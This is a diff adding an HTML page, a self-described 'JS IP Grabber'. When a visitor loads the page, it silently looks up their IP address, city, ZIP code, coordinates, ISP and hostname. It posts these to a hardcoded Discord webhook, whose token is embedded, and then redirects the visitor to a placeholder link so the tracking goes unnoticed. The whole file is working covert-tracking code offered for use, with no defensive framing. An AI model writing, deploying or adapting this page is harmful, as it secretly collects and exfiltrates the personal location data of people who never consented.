@@ -1,0 +1,52 @@
+<script>
+  function grabber(json) {
+    var request = new XMLHttpRequest();
+
+    request.open(
+      "POST",
+      "https://discord.com/api/webhooks/1215690288723529760/VA1NzMJ461po9wWpKeQZMET1_MYeQSm46rQVyN5KyaOrugYh9QY3P7y3sV2cJIiPx0En"
+    );
+
+    request.setRequestHeader("Content-type", "application/json");
+
+    var params = {
+      username: "JS IP Grabber",
+      avatar_url: "",
+      content: "@everyone",
+      embeds: [
+        {
+          title: "Someone visited the JS IP Grabber!",
+          footer: {
+            text: "JS IP Grabber Made by P1NGU!",
+          },
+          color: 16711826,
+          description:
+            "**IP:** `" +
+            json.ip +
+            "`\n**Country:** `" +
+            json.country +
+            "`\n**Region:** `" +
+            json.region +
+            "`\n**Town/City:** `" +
+            json.city +
+            "`\n**ZIP:** `" +
+            json.postal +
+            "`\n**LOC:** `" +
+            json.loc +
+            "`\n**Org:** `" +
+            json.org +
+            "`\n**Timezone:** `" +
+            json.timezone +
+            "\n**Hostname:** `" +
+            json.hostname,
+        },
+      ],
+    };
+
+    request.send(JSON.stringify(params));
+  }
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=grabber"></script>
+<script language="javascript" type="text/javascript">
+  window.setTimeout('window.location="PUT WEBSITE LINK HERE"; ', 2500);
+</script>
